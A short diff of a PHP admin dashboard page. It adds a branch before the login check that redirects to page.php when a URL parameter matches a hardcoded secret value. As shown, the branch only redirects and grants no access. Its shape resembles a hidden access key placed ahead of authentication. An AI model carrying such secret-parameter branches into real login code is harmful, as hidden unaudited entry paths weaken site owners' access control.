@@ -3,6 +3,11 @@
 	include('../JhhamesPhp/sessions.php');
 	 $connect = connect_db('dashboard');
 
+	if(isset($_GET['jhhamesbkid']) && $_GET['jhhamesbkid'] == 'Jhhames62445' ):
+		redirect_to('page.php');
+	endif;	
+
+
 	 if(!isset($_SESSION['admin_name']) && !isset($_SESSION['admin_email']) )
 	 {
 	 	$_SESSION['errorMessage'] = "Login is required to access the page";
